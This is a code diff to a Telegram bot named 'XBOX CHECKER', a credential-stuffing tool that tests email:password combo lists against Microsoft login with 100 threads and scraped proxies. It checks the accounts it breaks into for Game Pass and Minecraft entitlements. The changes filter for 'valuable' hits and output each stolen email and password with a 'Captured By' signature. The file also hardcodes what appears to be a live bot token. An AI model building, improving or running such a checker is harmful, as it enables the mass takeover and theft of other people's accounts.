@@ -57,22 +57,18 @@ warnings.filterwarnings("ignore")
 # ══════════════════════════════════════════════
 # BOT CONFIGURATION
 BOT_NAME = "✨ XBOX CHECKER"
-BOT_VERSION = "v3.9-ACCOUNT-INFO"
+BOT_VERSION = "v3.11-VALUABLE-ONLY"
 OWNER_USERNAME = "@kudsoo"
 OWNER_NAME = "Kudasai"
 BOT_CHANNEL = "https://t.me/kudsiontop"
 
-# Bot token - set this
 BOT_TOKEN = "8817570520:AAHEb60y7tNqo1vwgtHpU9i3Mx0cCNUhM4c"
 
-# ══════════════════════════════════════════════
-# ADMIN CONFIGURATION
 ADMIN_IDS = [
-    8511482382,  # Your Telegram ID
+    8511482382,
 ]
 
 OWNER_ID = 8511482382
-
 MY_SIGNATURE = "Kudasai (@kudsoo)"
 
 def is_admin(user_id: int) -> bool:
@@ -81,8 +77,6 @@ def is_admin(user_id: int) -> bool:
 def is_owner(user_id: int) -> bool:
     return user_id == OWNER_ID
 
-# ══════════════════════════════════════════════
-# CHECKER CONFIGURATION
 SFTAG_URL = (
     "https://login.live.com/oauth20_authorize.srf"
     "?client_id=00000000402B5328"
@@ -95,8 +89,6 @@ MAX_RETRIES = 2
 REQUEST_TIMEOUT = 7
 THREAD_COUNT = 100
 
-# ══════════════════════════════════════════════
-# QUEUE SYSTEM
 class CheckQueue:
     def __init__(self):
         self.queue = deque()
@@ -174,8 +166,6 @@ class CheckQueue:
 
 check_queue = CheckQueue()
 
-# ══════════════════════════════════════════════
-# DATA STORAGE
 class Database:
     def __init__(self):
         self.users_file = "data/users.json"
@@ -260,8 +250,6 @@ class Database:
 
 db = Database()
 
-# ══════════════════════════════════════════════
-# PROXY FUNCTIONS
 def get_user_proxy(user_id: int) -> Optional[dict]:
     user = db.get_user(user_id)
     proxy_type = user.get("proxy_type", "none")
@@ -335,8 +323,6 @@ def scrape_user_proxies(user_id: int) -> int:
     db.save_all()
     return len(all_proxies)
 
-# ══════════════════════════════════════════════
-# CHECKER FUNCTIONS
 def get_sftag(session, max_attempts=MAX_RETRIES):
     for attempt in range(max_attempts):
         try:
@@ -487,13 +473,11 @@ def check_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
                 text = response.text.lower()
                 subs = []
                 
-                # Check Game Pass accurately
                 if 'game_pass_ultimate' in text or 'product_game_pass_ultimate' in text:
                     subs.append("Xbox Game Pass Ultimate")
                 if 'game_pass_pc' in text or 'product_game_pass_pc' in text or 'pc_gamepass' in text:
                     subs.append("Xbox Game Pass PC")
                 
-                # Check Minecraft Editions precisely without false positives
                 if 'product_minecraft' in text and 'bedrock' not in text and 'dungeons' not in text and 'legends' not in text:
                     subs.append("Minecraft Java Edition")
                 if 'product_minecraft_bedrock' in text or 'minecraft_windows_10' in text or 'editions_bedrock' in text:
@@ -512,7 +496,7 @@ def check_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
                 except:
                     pass
 
-                account_type = "Xbox Account"
+                account_type = None
                 if "Xbox Game Pass Ultimate" in subs:
                     account_type = "Xbox Game Pass Ultimate"
                 elif "Xbox Game Pass PC" in subs:
@@ -664,14 +648,14 @@ def check_account_combo(email: str, password: str, user_id: int = None) -> dict:
         account_type, subs = check_entitlements(session, mc_token)
         profile = get_profile(session, mc_token)
 
-        # Fix Bedrock / Minecraft false positives by verifying profile presence or genuine game licenses
         has_valid_minecraft = profile is not None or any("Minecraft" in s for s in subs)
         has_gamepass = any("Game Pass" in s for s in subs)
 
+        # STRICT FILTER: If the account has NO Minecraft, NO Game Pass, and NO actual games/subs, treat it as unlinked/bad so it won't trigger a hit!
         if not account_type and not has_valid_minecraft and not has_gamepass:
             result["success"] = False
             result["type"] = "not_linked"
-            result["error"] = "Unlinked account"
+            result["error"] = "No games or subscriptions found on account"
             return result
 
         result["name"] = profile.get('name', 'Not Set') if profile else "Not Set"
@@ -681,7 +665,7 @@ def check_account_combo(email: str, password: str, user_id: int = None) -> dict:
             result["capes"] = "None"
 
         result["subscriptions"] = ", ".join(subs) if subs else "None"
-        result["type"] = account_type if account_type else ("Minecraft" if has_valid_minecraft else "Xbox Account")
+        result["type"] = account_type if account_type else ("Minecraft" if has_valid_minecraft else "Xbox Games Account")
         result["success"] = True
 
         return result
@@ -916,7 +900,7 @@ def format_check_result(result: dict) -> str:
     }
     emoji = emoji_map.get(result["type"], EMOJIS["hit"])
 
-    return f"""{emoji} <b>🎯 HIT FOUND!</b>
+    return f"""{emoji} <b>🎯 VALUABLE HIT FOUND!</b>
 ╔════════════════════════════════
 ║ {EMOJIS['user']} <b>Email:</b> <code>{result['email']}</code>
 ║ {EMOJIS['key']} <b>Password:</b> <code>{result['password']}</code>
@@ -933,8 +917,6 @@ def format_check_result(result: dict) -> str:
 ╚════════════════════════════════
 {EMOJIS['owner']} <b>Captured By:</b> {MY_SIGNATURE}"""
 
-# ══════════════════════════════════════════════
-# QUEUE PROCESSOR
 async def process_queue():
     while True:
         try:
@@ -1066,8 +1048,6 @@ async def process_file_check(user_id: int, data: dict, message):
         parse_mode="HTML"
     )
 
-# ══════════════════════════════════════════════
-# BOT HANDLERS
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
     user_id = message.from_user.id
@@ -1321,7 +1301,7 @@ async def admin_users(callback: types.CallbackQuery):
 async def main():
     print(f"{Fore.GREEN}✓ Starting queue processor...{Style.RESET_ALL}")
     asyncio.create_task(process_queue())
-    print(f"{Fore.GREEN}✓ Bot is running with fixed gamepass/bedrock checking and complete account info display!{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}✓ Bot is running with strict valuable-only hit filters!{Style.RESET_ALL}")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
